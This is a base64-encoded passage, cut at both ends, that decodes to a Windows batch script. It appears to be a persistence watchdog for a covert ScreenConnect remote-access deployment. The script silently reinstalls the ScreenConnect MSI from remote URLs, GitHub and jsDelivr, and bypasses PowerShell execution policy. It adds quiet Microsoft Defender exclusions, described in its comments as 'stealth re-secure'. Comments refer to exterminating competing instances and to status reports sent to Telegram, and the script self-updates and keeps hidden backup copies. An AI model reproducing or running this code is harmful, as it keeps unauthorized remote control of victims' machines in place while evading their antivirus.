R1NUQVRFPSUlUiINCmlmIC9JICIhUkVHU1RBVEUhIj09InllcyIgKA0KICBlY2hvIHByaW1hcnlf
cmVnaXN0ZXJlZF9za2lwX2ZyZXNoX2luc3RhbGw+PiIlTE9HJSINCiAgcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
JVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05W
RVIlIC1FeHRyYSAicmVnaXN0ZXJlZC1zdHVjayIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUg
RE9XTiAiUHJpbWFyeSByZWdpc3RlcmVkIGJ1dCBzZXJ2aWNlIG1pc3NpbmcgLSAvZmEgZmFpbGVk
OyByZWZ1c2VkIC9pIHRvIHByb3RlY3QgQUxUL0dSWVhBIg0KICBnb3RvIDpBZnRlckhlYWwNCikN
CnJlbSBPMzc6IHJlZnVzZSBzZXZyeiAvaSB3aGVuIGdyeXhhIGFscmVhZHkgcHJlc2VudCDigJQg
c2hhcmVkIGxlZ2FjeSBVcGdyYWRlQ29kZXMNCnJlbSB7MEM5NDQ0OEJ9L3sxRjg1RDdGRX0gbWFr
ZSBzaWJsaW5nIG1zaWV4ZWMgL2kga25vY2sgR3J5eGEgT0ZGTElORSBpbiBwYW5lbC4NCnNldCAi
R1JFRz11bmtub3duIg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAidXNlYmFj
a3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
biByZWdpc3RlcmVkIC1GcCAiJUdSWVhBX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJH
UkVHPSUlUiINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5u
dWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSRUc9eWVzIg0KaWYgL0kgIiFHUkVH
ISI9PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3NraXBfaV9wcm90ZWN0X2dyeXhhPj4iJUxPRyUi
DQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIg
IiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInByb3RlY3QtZ3J5eGEtc2tpcC1wcmltYXJ5
LWkiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlByaW1hcnkgbWlzc2luZyAtIHJl
ZnVzZWQgc2V2cnogL2kgdG8gcHJvdGVjdCBHcnl4YSAoc2hhcmVkIFNDIFVwZ3JhZGVDb2Rlcyk7
IC9mYSBvbmx5Ig0KICBnb3RvIDpBZnRlckhlYWwNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBj
YWxsIDpJbnN0YWxsTXNpICIlTVNJX1VSTCUiICJtYWluIg0KaWYgIiVJTlNUQUxMRUQlIj09IjAi
IGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMSU/dD0lUkFORE9NJSIgImdpdGh1Yi1wa2ciDQpp
ZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9QS0cyJSIgImpzZGVs
aXZyLXBrZyINCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoDQogIHJlbSBwcmVmZXIgd29ya2VyLWNh
Y2hlZCAud3VjYWNoZVxwa2cubXNpIChzYW1lIGJpbmFyeSBhcyBkZXBsb3kpDQogIGF0dHJpYiAt
aCAtcyAtciAiJU1TSUNBQ0hFJSIgPm51bCAyPiYxDQogIGZvciAlJUYgaW4gKCIlTVNJQ0FDSEUl
IikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKA0KICAgIGVjaG8gd3VjYWNoZV9wa2dfcmV0cnk+
PiIlTE9HJSINCiAgICBhdHRyaWIgLWggLXMgLXIgIiVNU0klIiA+bnVsIDI+JjENCiAgICBjb3B5
IC95ICIlTVNJQ0FDSEUlIiAiJU1TSSUiID5udWwgMj4mMQ0KICApDQogIGZvciAlJUYgaW4gKCIl
TVNJJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgICBlY2hvIGNhY2hlIHJldHJ5IGlu
c3RhbGw+PiIlTE9HJSINCiAgICBjYWxsIDpOb01zaVBvbGljeQ0KICAgIG1zaWV4ZWMgL2kgIiVN
U0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2
ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxDQogICAgc2V0ICJNU0lFWElUPSFFUlJPUkxF
VkVMISINCiAgICBlY2hvIGNhY2hlIG1zaWV4ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCiAg
ICBpZiAiIU1TSUVYSVQhIj09IjE2MTgiICgNCiAgICAgIHRpbWVvdXQgL3QgMzAgL25vYnJlYWsg
Pm51bA0KICAgICAgbXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEg
UkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwyLmxvZyIgPm51bCAyPiYx
DQogICAgICBzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KICAgICAgZWNobyBjYWNoZV9yZXRy
eTE2MThfZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCiAgICApDQogICAgY2FsbCA6V2FpdFN2Yw0K
ICApDQopDQpjYWxsIDpSZXN0b3JlQWx0DQpjYWxsIDpFbnN1cmVHcnl4YU11c3QNCmlmICIlSU5T
VEFMTEVEJSI9PSIwIiAoDQogIGlmIGV4aXN0ICIlV0QlXG1zaV9oZWFsLmxvZyIgKA0KICAgIGVj
aG8gLS0tIG1zaV9oZWFsLmxvZyB0YWlsIC0tLT4+IiVMT0clIg0KICAgIHBvd2Vyc2hlbGwgLU5v
UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgIkdldC1Db250ZW50IC1MaXRlcmFsUGF0
aCAnJVdEJVxtc2lfaGVhbC5sb2cnIC1UYWlsIDEwIiA+PiIlTE9HJSIgMj4mMQ0KICApDQogIGlm
IG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWElUPWZldGNoLWZhaWwiDQogIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWls
ZCAlTU9OVkVSJSAtRXh0cmEgIm1zaS1mYWlsZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRl
IEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbiBhbGwgc291cmNlcyAobXNpZXhlYyBleGl0ICVN
U0lFWElUJSkiDQopIGVsc2UgKA0KICBlY2hvIHN2YyByZXN0b3JlZD4+IiVMT0clIg0KICBwb3dl
cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNz
IC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAt
QnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3Rh
dGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5lY3QgcmVpbnN0YWxsZWQgT0siDQopDQoNCjpBZnRlckhl
YWwNCnJlbSBNMTY6IEFMVCBwcmVzZW50LWJ1dC1zdG9wcGVkIC0+IHJlc3RhcnQsIHRoZW4gcmVw
YWlyLWJ5LUdVSUQgKGV2ZXJ5IHRpY2spDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2MgcXVlcnkg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0K
ICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gYWx0IHN0b3BwZWQgLSByZXN0YXJ0L3JlcGFp
cj4+IiVMT0clIg0KICAgIG5ldCBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAl
KSIgPm51bCAyPiYxDQogICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQ
JSkiID5udWwgMj4mMQ0KICAgIHRpbWVvdXQgL3QgNSAvbm9icmVhayA+bnVsDQogICAgc2MgcXVl
cnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51
bA0KICAgIGlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
RmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdv
cmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogICkNCikNCnJlbSBNMTc6IEFMVCBzZXJ2aWNl
IGVudHJ5IGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZCAtPiByZXBhaXItYnktR1VJRCBl
dmVyeSB0aWNrDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51
bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIGFsdF9taXNzaW5nX3RyeV9yZXBhaXI+
PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
b3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0Ql
IiA+PiIlTE9HJSIgMj4mMQ0KKQ0KcmVtIChleHRlcm1pbmF0aW9uIGFscmVhZHkgcmFuIHByZS1o
ZWFsIGluIFtFXTsgZm9yZWlnbiBzdXJ2aXZvcnMgY291bnRlZCB0aGVyZSkNCg0KcmVtIOKUgOKU
gCBbRl0gc3RlYWx0aCByZS1zZWN1cmUgKHF1aWV0IERlZmVuZGVyIGV4Y2x1c2lvbiByZWZyZXNo
KSDilIDilIANCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlv
blBvbGljeSBCeXBhc3MgLUNvbW1hbmQgInRyeSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
blBhdGggJyVXRCUnLCclRVRMJScgLUVycm9yQWN0aW9uIFN0b3AgfSBjYXRjaCB7fSIgPm51bCAy
PiYxDQoNCnJlbSDilIDilIAgW0ddIHBlcmlvZGljIGZ1bGwgcmUtc2VjdXJlIGV2ZXJ5IH4yIGgg
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSADQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigo
VGVzdC1QYXRoICclV0QlXG93bl9zZWN1cmUuY21kJykgLWFuZCAoKCAtbm90IChUZXN0LVBhdGgg
JyVXRCVcc2VjLmZsYWcnKSkgLW9yICgoKEdldC1EYXRlKSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBh
dGggJyVXRCVcc2VjLmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSAyKSkpeyBl
eGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAg
ZWNobyBwZXJpb2RpYyByZS1zZWN1cmU+PiIlTE9HJSINCiAgY2FsbCAiJVdEJVxvd25fc2VjdXJl
LmNtZCIgPj4iJUxPRyUiIDI+JjENCiAgZWNobyBkb25lPiIlV0QlXHNlYy5mbGFnIg0KKQ0KDQpy
ZW0g4pSA4pSAIFtHMl0gR3J5eGEgTVVTVC1SVU4g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpyZW0gTzQwOiBpZiBBTlkgbm9uLXNl
dnJ6IFNDIFJ1bm5pbmcg4oaSIG5ldmVyIG1zaWV4ZWMgKHN0b3BzIHBhbmVsIGR1cGxpY2F0ZXMp
Lg0Kc2V0ICJHUllYQV9PSz0wIg0Kc2V0ICJHUllYQV9XQVM9MCINCnNldCAiRE9fREVFUD0wIg0K
aWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVs
aW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJSRU5U
X0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCg0KcmVtIERldGVjdCBhbnkgUnVubmluZyBub24tc2V2
cnogU2NyZWVuQ29ubmVjdCAodHJ1ZSBHcnl4YSBwcmVzZW5jZSkNCnBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
b3duX2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEtaGVhbHRoIC1Xb3JrRGlyICIlV0QlIiA+IiVXRCVc
Z3J5eGFfaGVhbHRoLm91dCIgMj5udWwNCnNldCAiR0g9Ig0KaWYgZXhpc3QgIiVXRCVcZ3J5eGFf
aGVhbHRoLm91dCIgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKCIlV0QlXGdyeXhh
X2hlYWx0aC5vdXQiKSBkbyBzZXQgIkdIPSUlUiINCmVjaG8gZ3J5eGFfaGVhbHRoPSFHSCE+PiIl
TE9HJSINCmVjaG8gIUdIIXwgZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWSIgPm51bA0KaWYgbm90
IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiR1JZWEFfT0s9MSINCiAgc2V0ICJHUllYQV9XQVM9MSIN
CiAgaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCog
ZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9PSJDVVJS
RU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCikNCg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKCAtbm90IChUZXN0LVBhdGggJyVHUllYQV9ERUVQ
JScpKSAtb3IgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVHUllYQV9ERUVQ
JScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSA4KSl7IGV4aXQgMSB9IGVs
c2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgc2V0ICJET19ERUVQPTEi
DQoNCnJlbSBIZWFsdGh5ICsgbm90IGRlZXAgZHVlIOKGkiB6ZXJvIHdvcmsNCmlmICIlR1JZWEFf
T0slIj09IjEiIGlmICIlRE9fREVFUCUiPT0iMCIgKA0KICBlY2hvIGdyeXhhX3NraXBfYWxyZWFk
eV9oZWFsdGh5Pj4iJUxPRyUiDQogIGdvdG8gOkdyeXhhQWZ0ZXINCikNCg0KcmVtIERlZXAgb3Ig
bWlzc2luZzogZ3J5eGEtZW5zdXJlIG9ubHkgKGxpYiBsb2NrcyBtc2lleGVjIGlmIFJ1bm5pbmcp
DQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBzZXQgIkdSRVM9Ig0KICBpZiAiJURP
X0RFRVAlIj09IjEiICgNCiAgICBlY2hvIGdyeXhhX2RlZXBfYmVnaW4+PiIlTE9HJSINCiAgICBm
b3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
Yi5wczEiIC1BY3Rpb24gZ3J5eGEtZW5zdXJlIC1EZWVwIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQg
JU1PTlZFUiVgKSBkbyBzZXQgIkdSRVM9JSVSIg0KICApIGVsc2UgKA0KICAgIGZvciAvZiAidXNl
YmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFj
dGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFj
dGlvbiBncnl4YS1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJWApIGRvIHNl
dCAiR1JFUz0lJVIiDQogICkNCiAgZWNobyBncnl4YV9lbnN1cmVfcmVzdWx0PSFHUkVTIT4+IiVM
T0clIg0KICBlY2hvICFHUkVTIXwgZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWSIgPm51bA0KICBp
ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCikNCmlmICIlRE9fREVFUCUiPT0i
MSIgZWNobyBkb25lPiIlR1JZWEFfREVFUCUiDQppZiAiJUdSWVhBX09LJSI9PSIwIiBjYWxsIDpF
bnN1cmVHcnl4YU11c3QNCg0KOkdyeXhhQWZ0ZXINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIg
Zm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhh
LmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQpz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJVTk5J
TkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KcmVtIGFsc28g
T0sgaWYgYW55IG5vbi1zZXZyeiBzdGlsbCBydW5uaW5nDQppZiAiJUdSWVhBX09LJSI9PSIwIiAo
DQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEtaGVhbHRoIC1X
b3JrRGlyICIlV0QlIiAyPm51bCB8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwNCiAg
aWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQopDQoNCmlmICIlR1JZWEFfT0sl
Ij09IjEiIGlmICIlR1JZWEFfV0FTJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
Yi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0
cmEgImdyeXhhLXJlc3RvcmVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdHcnl4YSBSRVNUT1JFRCAi
R3J5eGEgU2NyZWVuQ29ubmVjdCBoZWFsdGh5IChzdmMgcnVubmluZykiDQopDQppZiAiJUdSWVhB
X09LJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3Rh
dGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgImdyeXhhLW11c3QtZmFp
bCIgPm51bCAyPiYxDQogIGNhbGwgOlRnR3J5eGEgRE9XTiAiR3J5eGEgTVVTVC1SVU4gLSBzZXJ2
aWNlIG5vdCBSdW5uaW5nIGFmdGVyIGhlYWwiDQopDQoNCnJlbSDilIDilIAgW0hdIHF1aWV0IGRp
Z2VzdCAoc2tpcCBoZWFsdGh5IGhvc3RzIOKAlCB3YXMgZmxvb2RpbmcgVGVsZWdyYW0pIOKUgOKU
gA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
czEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSA+bnVsIDI+
JjENCnNldCAiTkVFRF9IQj0wIg0KaWYgIiVQUklNX09LJSI9PSIwIiBzZXQgIk5FRURfSEI9MSIN
CmlmICVGT1JFSUdOX0xFRlQlIEdUUiAwIHNldCAiTkVFRF9IQj0xIg0KaWYgIiVHUllYQV9PSyUi
PT0iMCIgc2V0ICJORUVEX0hCPTEiDQppZiAiJU5FRURfSEIlIj09IjAiICgNCiAgZWNobyBoYl9z
a2lwX2hlYWx0aHk+PiIlTE9HJSINCikgZWxzZSAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVIQkZMQUclJykgLWFuZCAo
TmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclSEJGTEFHJScpLkxh
c3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMzYwKXsgZXhpdCAwIH0gZWxzZSB7IGV4aXQg
MSB9IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIGhiPiVIQkZMQUcl
DQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9s
aWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgSEIgLU1vZGUgY29t
cGFjdCAtQnVpbGQgJU1PTlZFUiUgLUNvdW50ICFDT1VOVCEgPm51bCAyPiYxDQogICAgZWNobyBk
aWdlc3QgSEIgc2VudD4+IiVMT0clIg0KICApDQopDQoNCnJlbSDilIDilIAgW0ldIHNlbGYtdXBk
YXRlIGFwcGx5IChsYXN0IHRoaW5nIHRoaXMgdGljaykg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSADQppZiAiJVNFTEZfVVBEJSI9PSIxIiAoDQogIGVjaG8gc2VsZi11
cGRhdGUgYXBwbHk+PiIlTE9HJSINCiAgYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9tb24uY21k
IiA+bnVsIDI+JjENCiAgbW92ZSAveSAiJVdEJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24u
Y21kIiA+bnVsIDI+JjENCikNCnJlbSBrZWVwIGR1YWwtcGF0aCBiYWNrdXAgaW4gc3luYyBldmVy
eSB0aWNrDQppZiBub3QgZXhpc3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4mMQ0KaWYg
ZXhpc3QgIiVXRCVcb3duX21vbi5jbWQiICgNCiAgYXR0cmliIC1oIC1zIC1yICIlRVRMJVxldGxf
bW9uLmNtZCIgPm51bCAyPiYxDQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5jbWQiICIlRVRMJVxl
dGxfbW9uLmNtZCIgPm51bCAyPiYxDQopDQpkZWwgL2YgL3EgIiVNVVRFWCUiID5udWwgMj4mMQ0K
DQplY2hvIHRpY2sgZG9uZTogcHJpbT0lUFJJTV9PSyUgZ3J5eGE9JUdSWVhBX09LJSBhbHQ9JUFM
VF9PSyUgZm9yZWlnbj0lRk9SRUlHTl9MRUZUJT4+IiVMT0clIg0KZW5kbG9jYWwNCmV4aXQgL2Ig
MA0KDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIGhl
bHBlcnMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQo6RW5z
dXJlR3J5eGFNdXN0DQpyZW0gTzQxOiB0aGluIHdyYXBwZXIgLSBuZXZlciBtc2lleGVjOyBncnl4
YS1lbnN1cmUgKyBSdW5uaW5nIGxvY2suDQpzZXQgIkdSWVhBX09LPTAiDQppZiBleGlzdCAiJVdE
JVxvd25fbGliLnBzMSIgKA0KICBzZXQgIkdSRVM9Ig0KICBmb3IgL2YgInVzZWJhY2txIGRlbGlt
cz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gZ3J5eGEt
ZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiVgKSBkbyBzZXQgIkdSRVM9JSVS
Ig0KICBlY2hvIGdyeXhhX211c3RfbGliPSFHUkVTIT4+IiVMT0clIg0KICBlY2hvICFHUkVTIXwg
ZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWSIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNl
dCAiR1JZWEFfT0s9MSINCikNCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2Vi
YWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlm
IC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQpzYyBxdWVyeSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlm
IG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KaWYgIiVHUllYQV9PSyUiPT0iMSIg
KGVjaG8gZ3J5eGFfbXVzdF9ydW5uaW5nX29rPj4iJUxPRyUiKSBlbHNlIChlY2hvIGdyeXhhX211
c3Rfc3RpbGxfZG93bj4+IiVMT0clIikNCmV4aXQgL2IgMA0KDQo6VGdHcnl4YQ0KcmVtICUxPWtp
bmQgJTI9bXNnIOKAlCBwZXItR3J5eGEgc3RhdGUgc28gaXQgY2Fubm90IHJldXNlIFByaW1hcnkg
b3duX21vbi5zdGF0ZS4NCnNldCAiR1NUQVRFPSV+MSINCnNldCAiR01TRz0lfjIiDQpzZXQgIkdT
VEFURUZJTEU9JVdEJVxvd25fbW9uX2dyeXhhLnN0YXRlIg0Kc2V0ICJHT0xEPSINCmlmIGV4aXN0
ICIlR1NUQVRFRklMRSUiIHNldCAvcCBHT0xEPTwiJUdTVEFURUZJTEUlIg0KaWYgL0kgIiVHU1RB
VEUlIj09IlJFU1RPUkVEIiAoDQogIGlmIC9JICIlR09MRCUiPT0iUkVTVE9SRUQiIGV4aXQgL2Ig
